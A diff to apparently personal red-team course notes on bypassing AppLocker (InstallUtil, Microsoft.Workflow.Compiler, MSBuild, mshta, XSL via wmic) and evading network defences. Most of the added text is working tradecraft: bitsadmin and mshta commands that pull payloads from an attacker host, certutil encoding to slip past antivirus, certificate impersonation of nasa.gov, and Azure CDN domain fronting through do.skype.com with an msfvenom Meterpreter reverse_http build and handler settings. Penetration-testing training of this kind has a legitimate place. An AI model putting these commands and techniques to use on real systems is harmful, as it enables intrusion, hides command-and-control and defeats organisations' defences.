@@ -2436,6 +2436,22 @@ catch(e)
 
 # Application Whitelisting
 
+3 primary AppLocker rule categories, which can be combined as needed:
+1. based on file paths: used to whitelist a single file based on its filename and path or recursively include the contents of a directory.
+2. based on a file hash: allow a single file to execute regardless of the location. To avoid collisions, AppLocker uses a SHA256 Authenticode hash.
+3. based on a digital signature: whitelist all files from an individual publisher with a single signature, which simplifies whitelisting across version updates.
+
+4 rule properties which enable enforcement for 4 separate file types.
+1. executables with the `.exe` file extension
+2. Windows Installer files which use the "`.msi`" file extension.
+3. PowerShell scripts, Jscript scripts, VB scripts and older file formats using the `.cmd` and `.bat` file extensions. This property does not include any third-party scripting engines like Python nor compiled languages like Java.
+4. Packaged Apps (also known as Universal Windows Platform (UWP) Apps) which include applications that can be installed from the Microsoft App store.
+
+Default rules:
+* Block all applications except those explicitly allowed.
+* Allow all users to run executables in `C:\Program Files`, `C:\Program Files (x86)`, and `C:\Windows` recursively, including executables in all subfolders. This allows basic operating system functionality but prevents non-administrative users from writing in these folders due to default access rights.
+* Allows members of the administrative group to run any executables they desire.
+
 ## Basic Bypasses
 
 ### Trusted Folders
@@ -2564,14 +2580,17 @@ type C:\Tools\test.txt
 
 ### PowerShell CLM Bypass
 
-Leverage InstallUtil, a command-line utility that allows us to install and uninstall server resources by executing the installer components in a specified assembly. We can abuse it to execute arbitrary C# code.
+Leverage **InstallUtil**, a command-line utility that allows us to install and uninstall server resources by executing the installer components in a specified assembly.
 
-To use InstallUtil in this way, we must put the code we want to execute inside either the install or uninstall methods of the installer class.
+=> abuse it to execute arbitrary C# code by putting the code inside either the install or uninstall methods of the installer class.
+
 We are only going to use the uninstall method since the install method requires administrative privileges to execute.
 
-The System.Configuration.Install namespace is missing an assembly reference in Visual Studio. We can add this by again right-clicking on References in the Solution Explorer and choosing Add References.... From here, we'll navigate to the Assemblies menu on the left-hand side and scroll down to System.Configuration.Install.
+The System.Configuration.Install namespace is missing an assembly reference in Visual Studio.
 
-We enabled AppLocker DLL rules to block untrusted DLLs. Leverage InstallUtil to bypass AppLocker and revive the powerful reflective DLL injection technique.
+=> add this by right-clicking on **References** in the Solution Explorer and choosing **Add References**.... > navigate to the **Assemblies** menu on the left-hand side and scroll down to **System.Configuration.Install**.
+
+Enabled AppLocker DLL rules to block untrusted DLLs. Leverage InstallUtil to bypass AppLocker and revive the powerful reflective DLL injection technique.
 
 ```csharp
 using System;
@@ -2616,13 +2635,13 @@ namespace Bypass
 C:\Windows\Microsoft.NET\Framework64\v4.0.30319\installutil.exe /logfile= /LogToConsole=false /U C:\Tools\Bypass.exe
 ```
 
-At this point, it would be possible to reuse this tradecraft with the Microsoft Word macros we developed in a previous module since they are not limited by AppLocker. Instead of using WMI to directly start a PowerShell process and download the shellcode runner from our Apache web server, we could make WMI execute InstallUtil and obtain the same result despite AppLocker.
+At this point, it would be possible to reuse this tradecraft with the Microsoft Word macros since they are not limited by AppLocker. Instead of using WMI to directly start a PowerShell process and download the shellcode runner from our Apache web server, we could **make WMI execute InstallUtil** and obtain the same result despite AppLocker.
 
-The issue is that **the compiled C# file has to be on disk when InstallUtil is invoked**. We must download an executable, and ensure that it is not flagged by antivirus, neither during the download process nor when it is saved to disk.
+The issue is that **the compiled C# file has to be on disk when InstallUtil is invoked**. We must download an executable, and ensure that it is not flagged by antivirus.
 
-To attempt to bypass anitvirus, we are going to obfuscate the executable while it is being downloaded with Base64 encoding and then decode it on disk.
+To attempt to bypass anitvirus, obfuscate the executable while it is being downloaded with Base64 encoding and then decode it on disk.
 
-Well use the native **certutil** tool to perform the encoding and decoding and **bitsadmin** for the downloading.
+Use the native **certutil** tool to perform the encoding and decoding and **bitsadmin** for the downloading.
 
 ```bat
 certutil -encode C:\Users\Offsec\source\repos\Bypass\Bypass\bin\x64\Release\Bypass.exe file.txt
@@ -2640,7 +2659,7 @@ C:\Users\student>bitsadmin /Transfer myJob http://192.168.119.120/file.txt C:\us
 
 ### Microsoft.Workflow.Compiler
 
-Craft a file `test.txt` containing C# code, which implements a class that inherits from the Activity class and has a constructor. The file path must be inserted into the XML document along with compiler parameters organized in a serialized format.
+Craft a file named `test.txt` containing C# code, which implements a class that inherits from the **Activity** class and has a constructor.
 
 ```csharp
 using System;
@@ -2652,7 +2671,9 @@ public class Run : Activity{
 }
 ```
 
-Create this correctly-serialized XML format `run.xml`
+The file path must be inserted into the XML document named `run.xml` along with compiler parameters organized in a serialized format.
+
+Create the correctly-serialized XML format.
 
 ```pwsh
 $workflowexe = "C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe"
@@ -2674,13 +2695,15 @@ $Acl = Get-ACL $output;$AccessRule= New-Object System.Security.AccessControl.Fil
 C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe run.xml results.xml
 ```
 
-The downside to this attack is that we must provide both the XML file and the C# code file on disk, and the C# code file will be compiled temporarily to disk as well.
+The downside is that we must provide both the XML file and the C# code file on disk, and the C# code file will be compiled temporarily to disk as well.
 
 ### MSbuild
 
 `https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1127.001/T1127.001.md`
 
-Executes the code in a project file using `msbuild.exe`. The default C# project example file (`T1127.001.csproj`) will simply print "Hello From a Code Fragment" and "Hello From a Class." to the screen.
+Executes the code in a project file using `msbuild.exe`.
+
+The default C# project example file (`T1127.001.csproj`) will simply print "Hello From a Code Fragment" and "Hello From a Class." to the screen.
 
 ```xml
 <Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
@@ -2737,9 +2760,15 @@ C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe T1127.001.csproj
 
 ## Bypassing AppLocker with JScript
 
+The MSHTA client side attack vector works best against Internet Explorer. As Internet Explorer becomes less-used, this vector will become less relevant, but we'll reinvent it to bypass AppLocker and execute arbitrary Jscript code.
+
+Microsoft HTML Applications (MSHTA) work by executing `.hta` files with the native `mshta.exe` application. HTML Applications include embedded Jscript or VBS code that is parsed and executed by mshta.exe.
+
+Since mshta.exe is located in `C:\Windows\System32` and is a signed Microsoft application, it is commonly whitelisted.
+
 ### JScript and MSHTA
 
-`test.hta`
+`mshta http://192.168.119.120/test.hta`
 
 ```xhtml
 <html> 
@@ -2766,6 +2795,7 @@ C:\Windows\System32\mshta.exe http://192.168.119.120/test.hta
 ### XSL Transform
 
 `test.xsl`
+
 ```xsl
 <?xml version='1.0'?>
 <stylesheet version="1.0"
@@ -2789,3 +2819,311 @@ wmic process get brief /format:"http://192.168.119.120/test.xsl"
 
 # Bypassing Network Filters
 
+## DNS Filters
+
+`www.internetbadguys.com`
+
+[IPVoid](https://www.ipvoid.com/dns-reputation/)
+
+[VirusTotal](https://www.virustotal.com/gui/home/search)
+
+[OpenDNS](https://community.opendns.com/domaintagging/search/)
+
+Switch to an OpenDNS server
+
+```bash
+sudo bash -c "echo nameserver 208.67.222.222 > /etc/resolv.conf"
+```
+
+Register a new domain, but it may be categorized as a **Newly Seen Domain** => detrimental to the reputation score, since malware authors often use brand new domains.
+
+Domains in this category are often **less than 1 week old** and are relatively unused, lacking inquiries and traffic.
+
+=> Collect domain names in advance and generate lookups and traffic well in advance of an engagement.
+
+Make sure its **domain category** matches what the client allows. E.g., the "webmail" classification is often disallowed given the increased risk of downloaded malware.
+
+Pre-populate a web site on our domain with seemingly harmless content (like a cooking blog) to earn a harmless category classification.
+
+Subscribe to **domain categorization services** (like OpenDNS) so we can submit our own domain classifications. Even if our domain has been categorized as malicious, we can easily host a legitimate-looking website on the domain and request re-categorization.
+
+Submit the domain for a community review if voting is not available or if we would like to suggest a different category.
+ 
+Make the domain name itself appear legitimate => **typo-squatting**
+
+Finally, be aware of the status of the **IP address** of our C2 server. If the IP has been flagged as malicious, some defensive solutions may block the traffic. This is especially common on **shared hosting sites** in which one IP address hosts multiple websites. If one site on the shared host ever contained a browser exploit or was ever used in a watering hole malware campaign, the shared host may be flagged. Subsequently, every host that shares that IP may be flagged as well, and our C2 traffic may be blocked.
+
+Use a variety of lookup tools, like Virustotal and IPVoid sites to check the status of our C2 IP address before an engagement.
+
+Have several domains prepared in advance so we can swap them out as needed during an engagement.
+
+## Web Proxies
+
+[Symantec Corporation](https://sitereview.bluecoat.com/)
+
+When dealing with proxy servers, ensure that our payload is **proxy-aware**. When our payload tries to connect back to the C2 server, it must detect local proxy settings, and implement those settings instead of trying to connect to the given domain directly.
+=> Meterpreter's HTTP/S payload is proxy-aware (thanks to the InternetSetOptionA API).
+
+Ensure that the domain and URL are clean and that our C2 server is safely **categorized** as defined by our client's policy rules. 
+
+If the client has deployed a URL verification or categorization system, we should factor their policy settings into our bypass strategy.
+
+If our C2 server domain is uncategorized, we should follow the prompts to categorize it according to the company's allowed use policy, since an unnamed domain will likely be flagged.
+
+We could also grab a seemingly-safe domain by hosting our C2 in a **cloud service or Content Delivery Network (CDN)**, which auto-assigns a generic domain. E.g., `cloudfront.net`, `wordpress.com`, or `azurewebsites.net`. These types of domains are often auto-allowed since they are used by legitimate websites and hosting services.
+
+Consider the traces our C2 session will leave in the proxy logs. E.g., instead of simply generating custom TCP traffic on ports 80 or 443, our session should **conform to HTTP protocol standards**.
+=> many framework payloads, including Metasploit's Meterpreter, follow the standards as they use HTTP APIs like HttpOpenRequestA.
+
+Set our **User-Agent** to a browser type that is permitted by the organization. For example, if we know that the organization we are targeting uses Microsoft Windows with Edge, we should set it accordingly. E.g., a User-Agent for Chrome running on macOS will likely raise suspicion or might be blocked.
+
+To determine an allowed User-Agent string, consider social engineering or sniff HTTP packets from our internal point of presence.
+
+Use a site like `useragentstring.com` to build the string or choose from a variety of user-supplied strings.
+
+We can set our custom User-Agent in Meterpreter with the **HttpUserAgent** advanced configuration option.
+
+## IDS and IPS Sensors
+
+### Bypassing Norton HIPS with Custom Certificates
+
+Norton HIPS detects the standard Meterpreter HTTPS certificate. Certificates are used to ensure (or certify) the identity of a domain and encrypt network traffic through a variety of cryptographic mechanisms.
+
+Normally, certificates are issued by trusted authorities called Certificate Authorities (CA), which are well-known. For example, the CA trusted root certificates are pre-installed on most OS, which streamlines validation.
+
+Norton may be flagging this because it's a self-signed certificate => use a real SSL certificate, which requires that we own that domain. => Obtain a signed, valid certificate, perhaps from a service provider like **Let's Encrypt**.
+
+Consider that self-signed certificates are somewhat common for non-malicious use though. => Norton contains signatures for the data present in Meterpreter's randomized certificates. 
+
+Create our own self-signed certificate, customizing some of its fields in an attempt to bypass those signatures. There are several approaches we could consider:
+
+* Generate a self-signed certificate that matches a given domain with Metasploit's **impersonate_ssl** auxiliary module. This module will create a self-signed certificate whose metadata matches the site we are trying to impersonate.
+
+* Manually create a self-signed certificate with `openssl`, which allows us full control over the certificate details.
+
+We don't need to own a domain for this approach but if the certificate is passing through HTTPS inspection, the traffic might flag because of an untrusted certificate.
+
+* req: Create a self-signed certificate.
+* -new: Generate a new certificate.
+* -x509: Output a self-signed certificate instead of a certificate request.
+* -nodes: Do not encrypt private keys.
+* -out cert.crt: Output file for the certificate.
+* -keyout priv.key: Output file for the private key.
+
+```bash
+openssl req -new -x509 -nodes -out cert.crt -keyout priv.key
+cat priv.key cert.crt > nasa.pem
+```
+
+We also must change the CipherString in the `/etc/ssl/openssl.cnf` config file or our reverse HTTPS shell will not work properly. We will remove the "@SECLEVEL=2" string, as the SECLEVEL option limits the usable hash and cypher functions in an SSL or TLS connection. We'll set this to "DEFAULT", which allows all.
+
+`CipherString=DEFAULT@SECLEVEL=2` > `CipherString=DEFAULT`
+
+```
+use exploit/multi/handler
+set HandlerSSLCert /home/kali/self_cert/nasa.pem
+exploit
+```
+
+[impersonate_ssl](https://www.hackingarticles.in/bypass-detection-for-meterpreter-shell-impersonate_ssl/)
+
+Generate the certificate
+
+```
+use auxiliary/gather/impersonate_ssl
+set RHOST www.nasa.gov
+exploit
+```
+
+## Full Packet Capture Devices
+
+Full packet capture devices typically sit on a network tap, which will capture the traffic. These devices are typically used during post-incident forensic investigations.
+
+RSA's Netwitness is a common enterprise-level full packet capture system and Moloch is an alternative free open source alternative.
+
+## HTTPS Inspection
+
+If we are using HTTPS, we must simply assume that our traffic will be inspected and try to keep a low profile.
+
+=> Abort a payload if we suspect that it is being inspected. 
+
+Using **TLS Certificate Pinning** in Meterpreter, we can specify the certificate that will be trusted. Meterpreter will then compare the hash of the certificates and if there is a mismatch, it will terminate itself. This can be controlled by setting the **StagerVerifySSLCert** option to "true" and configuring **HandlerSSLCert** with the certificate we trust and want to use.
+
+Also try to **categorize** the target domain of our traffic to reduce the likelihood of inspection. Some categories, like "banking", are usually not subject to inspection because of privacy concerns.
+
+If we can categorize our domain to an accepted category, we may be able to bypass HTTPS inspection and, by extension, bypass other detection systems as well since our traffic is encrypted.
+
+## Domain Fronting
+
+Domain fronting was originally designed to circumvent Internet censorship systems.
+
+Large Content Delivery Networks (CDN) can be difficult to block or filter on a granular basis. Depending on the feature set supported by a CDN provider, domain fronting allows us to fetch arbitrary website content from a CDN, even though the initial TLS session is targeting a different domain. This is possible as the TLS and the HTTP session are handled independently. E.g., we can initiate the TLS session to `www.example1.com` and then get the contents of `www.example2.com`.
+
+With the advent of **virtual hosting**, multiple web sites associated with different domains could be hosted on a single machine, i.e. from a single IP address. The key to this functionality is the **request HOST header**, which specifies the **target domain name**, and optionally the port on which the web server is listening for the specified domain.
+ 
+After the DNS lookup is performed by the connecting client, the domain information is lost. The server will only see the IP address where the client tries to connect (which is its IP). Because of this, the target domain is represented in the HTTP request.
+
+On the hosting server itself, the Host header maps to a value in one of the web server's configuration files.
+
+E.g., NGINX configuration shown below
+
+```
+server {
+        listen 80;
+        listen [::]:80;
+
+        root /var/www/example.com/html;
+        index index.html index.htm index.nginx-debian.html;
+
+        server_name example.com www.example.com;
+
+        location / {
+                try_files $uri $uri/ =404;
+        }
+}
+```
+
+**server_name** lists the available domain names this particular configuration applies to.
+**root** field specifies what content is served for that domain name.
+=> a server can host many websites from a single host through multiple domain-centric configuration files.
+
+When a client connects to a server that runs TLS, the server must also determine which certificate to send in the response based on the client's request.
+
+Since the HTTP Host header is only available after the secure channel has been established, it can't be used to specify the target domain. Instead, the TLS **Server Name Indication** (SNI) field, which can be set in the "TLS Client Hello" packet during the TLS negotiation process, is used to specify the target domain and therefore the certificate that is sent in response.
+ 
+In response to this, the "TLS Server Hello" packet contains the certificate for the domain that was indicated in the client request SNI field.
+ 
+=> If `www.example2.com` is a blocked domain, but `www.example1.com` is not, we can make an HTTPS connection to a server and set the SNI to indicate that we are accessing `www.example1.com`. Once the TLS session is established and we start the HTTP session (over TLS), we can specify a different domain name in the Host header, for example `www.example2.com`. This will cause the webserver to serve content for that website instead. If our target is not performing HTTPS inspection, it will only see the initial connection to `www.example1.com`, unaware that we were connecting to `www.example2.com`.
+
+Tie this approach to Content Delivery Networks (CDN). On a larger scale, a CDN provides geographically-optimized web content delivery. CDN endpoints cache and serve the actual website content from multiple sources, and the HTTP request Host header is used to differentiate this content. It can serve us any resource (typically a website) that is being hosted on the same CDN network.
+
+E.g., `www.example.com` will point to the CDN endpoint's domain name (e.g.: `something.azureedge.net`) through DNS Canonical Name (CNAME) records. When a client looks up `www.example.com`, the DNS will recursively lookup `something.azureedge.net`, which will be resolved by Azure. 
+
+=> traffic will be directed to the CDN endpoint rather than the real server. Since CDN endpoints are used to serve content from multiple websites, the returned content is based on the Host header.
+
+E.g., we have a CDN network that is caching content for `good.com`. This endpoint has a domain name of `cdn1111.someprovider.com`.
+
+We'll create a CDN endpoint that is proxying or caching content to `malicious.com`. This new endpoint will have a domain name of `cdn2222.someprovider.com`, which means if we browse to this address, we eventually access `malicious.com`.
+
+Assuming that `malicious.com` is a blocked domain and `good.com` is an allowed domain, we could then subversively access `malicious.com`.
+
+1. The client initiates a DNS request to its primary DNS server to look up the IP of `good.com`.
+2. The primary DNS server asks the root DNS server for the IP address of `good.com`.
+3. The server replies with the configured **CNAME record** for that domain, which is `cdn1111.someprovider.com`.
+4. The primary DNS server queries the `someprovider.com` DNS server for the `cdn1111.someprovider.com` domain.
+5. The DNS server for `someprovider.com` replies with 192.168.1.1, which is the IP of the CDN endpoint.
+6. The primary DNS sends the reply to the client.
+7. The client initiates a TLS session to domain `good.com` to the CDN endpoint.
+8. The CDN endpoint serves the certificate for `good.com`.
+9. The client asks for the `cdn2222.someprovider.com resource`.
+10. The CDN endpoint serves the contents of `malicious.com`.
+
+If we are using HTTPS and no inspection devices are present, this primarily appears to be a connection to `good.com` because of the initial DNS request and the SNI entry from the TLS Client Hello.
+
+Even in an environment that uses HTTPS filtering, we can use this technique in various ways, such as to **bypass DNS filters**.
+
+Some CDN providers, like Google and Amazon, will **block requests if the host in the SNI and the Host headers don't match** => Microsoft Azure.
+
+In summary, this allows us to fetch content from sites that might be blocked otherwise and also allows us to hide our traffic.
+
+### Domain Fronting with Azure CDN
+
+Host a Meterpreter listener on our `meterpreter.info` domain.
+
+Set up a CDN in Azure to proxy requests to this domain
+
+* Resource group: The CDN profile must belong to a resource group. We can either select an existing one or create a new one. E.g., offsecdomainfront-rg
+* RG location: An arbitrary geographic area where we want to host the CDN.
+* Pricing tier: select "Standard Verizon". This affects not only the pricing, but also the features we will have access to, and will also affect the way the CDN works. The "Standard Microsoft" tier creates issues with TLS and the caching is also not as flexible.
+* CDN endpoint name: The hostname we will use in the HTTP header to access `meterpreter.info`. This can be anything that is available from Azure, e.g., `offensive-security` and the **suffix** will be `azureedge.net`.
+* Origin type: This should be set to "Custom origin".
+* Origin hostname: This would be the actual website that should be cached by CDN under normal cases. This is the domain where we host our C2 server `meterpreter.info`
+
+Caching will break our C2 channel, especially our reverse shells since they are not static and each request returns a unique response.
+
+To disable caching, we'll select our Endpoint and **Caching rules** > set **Caching behavior** to "Bypass cache", which will disable caching.
+
+We can also set **Query string caching behavior** to "Bypass caching for query strings", which will prevent the CDN from caching any requests containing query strings.
+
+On our machine, which is the destination for `meterpreter.info`, set up a simple Python HTTP and HTTPS listener to test web server functionality
+
+```bash
+python3 -m http.server 80
+```
+
+`python3 httpsserver.py`
+
+```python
+from http.server import HTTPServer, SimpleHTTPRequestHandler
+import ssl
+import socketserver
+
+httpd = socketserver.TCPServer(('138.68.99.177', 443), SimpleHTTPRequestHandler)
+
+httpd.socket = ssl.wrap_socket(httpd.socket, 
+        keyfile="key.pem", 
+        certfile='cert.pem', server_side=True)
+
+httpd.serve_forever()
+```
+
+```bash
+curl http://offensive-security.azureedge.net
+curl -k https://offensive-security.azureedge.net
+```
+
+Find a frontable domain
+
+```bash
+git clone https://github.com/rvrsh3ll/FindFrontableDomains
+cd FindFrontableDomains/
+sudo ./setup.sh
+```
+
+```bash
+python3 FindFrontableDomains.py --domain outlook.com
+```
+
+The output reveals over two thousand subdomains, and one of them, `assets.outlook.com`, is frontable.
+
+Test the viability of the domain `assets.outlook.com`
+
+```bash
+curl --header "Host: offensive-security.azureedge.net" http://assets.outlook.com
+```
+
+This returns a blank response because the CDN used by the `assets.outlook.com` domain is in a **different region or pricing tier**, which drastically affects our ability to use the domain for fronting.
+
+```bash
+python3 FindFrontableDomains.py --domain skype.com
+```
+
+Test the viability of the domain `do.skype.com`
+
+```bash
+curl --header "Host: offensive-security.azureedge.net" http://do.skype.com
+curl --header "Host: offensive-security.azureedge.net" https://do.skype.com
+```
+
+Meterpreter agent
+
+```bash
+msfvenom -p windows/x64/meterpreter/reverse_http LHOST=do.skype.com LPORT=80 HttpHostHeader=offensive-security.azureedge.net -f exe > http-df.exe
+```
+
+Meterpreter listener
+
+```
+use exploit/multi/handler
+set LHOST do.skype.com
+set OverrideLHOST do.skype.com
+set OverrideRequestHost true
+set HttpHostHeader offensive-security.azureedge.net
+run -j
+```
+
+If our target environment is not using HTTPS inspection, our HTTPS traffic will not only be hidden but it will appear to be directed to `do.skype.com`. Since many organizations use Skype for meetings, this traffic will be considered legitimate. This allows us to bypass domain, proxy, and IDS filters in one shot.
+
+Censys is a search engine similar to Shodan, searching Internet-connected devices based on their fingerprint information, like webserver type, certificate details, etc. Use this service to find Azure domain-frontable sites.
+
+### Domain Fronting in the Lab
